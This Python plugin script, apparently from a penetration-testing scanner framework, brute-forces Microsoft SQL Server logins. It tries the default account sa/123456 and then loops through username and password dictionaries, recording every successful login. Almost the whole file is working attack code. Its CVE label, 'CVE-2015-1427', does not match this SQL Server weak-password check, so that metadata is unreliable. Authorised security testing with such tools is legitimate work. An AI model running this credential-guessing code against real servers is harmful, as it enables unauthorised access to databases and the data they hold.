#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import pymssql
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SQLSERVER
        self.name = 'CVE-2015-1427'
        self.keyword = ['sqlserver', 'burst']
        self.info = 'sqlserver burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        try:
            db = pymssql.connect(server=self.target_host, port=self.target_port,  user='sa', password='123456' , charset="UTF-8", login_timeout=5)
            self.flag = 1
            self.req.append({"username": 'sa', "password": '123456'})
            self.res.append({"info": 'sa' + "/" + '123456', "key": 'sqlserver'})
        except Exception as e :
            if '\'sa' in str(e):
                usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/sqlserver_usernames.txt')
                passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/sqlserver_passwords.txt')
                for linef1 in usernamedic:
                    username = linef1.strip('\r').strip('\n')
                    for linef2 in passworddic:
                        password = (
                            linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                            '\r').strip('\n')
                        try:
                            db = pymssql.connect(server=self.target_host, port=self.target_port, user=username, password=password,charset="UTF-8" ,login_timeout = 5)
                            self.flag = 1
                            self.req.append({"username":username, "password": password})
                            self.res.append({"info": username + "/" + password, "key": 'sqlserver'})
                            return None
                        except:
                            pass

